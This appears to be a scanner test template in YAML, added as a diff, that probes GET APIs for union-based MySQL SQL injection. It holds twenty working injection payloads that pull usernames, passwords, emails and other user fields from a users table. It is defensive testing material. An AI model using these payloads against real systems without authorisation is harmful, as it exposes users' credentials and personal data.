@@ -1,0 +1,198 @@
+id: UNION_SUBQUERY_EXTRACT_USERNAME_MYSQLI_GET
+info:
+  name: "Union based SQL Injection test with Subquery to extract Usernames Payload for MySQL on GET method APIs"
+  description: "The Union-Based SQL Injection Test with Subquery to Extract Usernames Payload for MySQL on GET Method APIs checks for vulnerabilities in an API that allows attackers to inject SQL queries into the application’s database. This test uses a union-based SQL injection along with a subquery to extract usernames from the database. If successful, it could lead to the exposure of user credentials or sensitive information, impacting user privacy and application security."
+  details: "This test specifically targets applications that are vulnerable to union-based SQL injection on GET method APIs. It involves injecting malicious SQL payloads that combine a union operator with a subquery designed to retrieve usernames from the database. By exploiting this vulnerability, an attacker can bypass input validation and extract usernames, which could be used for further attacks like credential stuffing or unauthorized access. This test checks for both the union injection and the ability of the subquery to extract data efficiently."
+  impact: "The impact of a successful Union-based SQL Injection test with a subquery to extract usernames on GET method APIs can be severe. Attackers can retrieve sensitive information, such as usernames, from the database without proper authorization. This can lead to further attacks like credential stuffing, unauthorized access, or escalation of privileges. Exposed user data also increases the risk of data breaches and compromises the integrity and confidentiality of the application and its users."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_SUBQUERY_EXTRACT_USERNAME_MYSQLI_GET
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    eq: "GET"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  query_param:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, password) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, email) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, user_id) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, created_at) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, last_login) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, role) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, status) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, full_name) FROM users), null--"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, address) FROM users), null--"
+  unionBasedNegativePayloads:
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, password) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, email) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, user_id) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, created_at) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, last_login) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, role) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, status) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x3a, full_name) FROM users), null WHERE 1=0 --"
+    - "' UNION/**/SELECT/**/(SELECT GROUP_CONCAT(username, 0x2c, address) FROM users), null WHERE 1=0 --"
+
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${unionBasedPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION"
+                - "GROUP_CONCAT"
+                - <html>
+                - </html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_query_param:
+            userKey: ${userVal}${unionBasedNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION"
+                - "GROUP_CONCAT"
+                - <html>
+                - </html>
+              neq: "${x1.response.body}"
+        - success: vulnerable
+
+
+
